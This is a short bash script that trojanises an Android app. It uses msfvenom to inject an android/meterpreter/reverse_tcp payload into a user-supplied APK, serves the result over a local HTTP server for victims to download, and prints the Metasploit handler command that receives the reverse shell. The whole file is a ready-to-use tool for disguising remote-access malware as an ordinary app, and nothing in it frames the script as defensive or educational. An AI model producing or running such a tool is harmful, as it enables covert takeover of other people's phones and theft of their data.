#!/bin/bash

# Requirements check
if ! command -v msfvenom &> /dev/null; then
    echo "msfvenom not found! Installing Metasploit..."
    sudo apt update
    sudo apt install metasploit-framework -y
fi

# Prompt for IP address and APK file
read -p "Enter your IP address (LHOST): " ip_address
read -p "Enter the path to the original APK file: " apk_file

# Check if the APK file exists
if [[ ! -f "$apk_file" ]]; then
    echo "APK file not found!"
    exit 1
fi

# Generate output file name
output_file="payload_injected.apk"

# Create the payload-injected APK
echo "Injecting payload into the APK..."
msfvenom -x "$apk_file" -p android/meterpreter/reverse_tcp LHOST="$ip_address" LPORT=4444 -o "$output_file"

# Set up a simple HTTP server to share the APK
echo "Setting up HTTP server..."
python3 -m http.server 8080 &

echo "APK created successfully!"
echo "You can download the APK at: http://$ip_address:8080/$output_file"

echo "To listen for connections, run the following in Metasploit:"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $ip_address; set LPORT 4444; exploit'"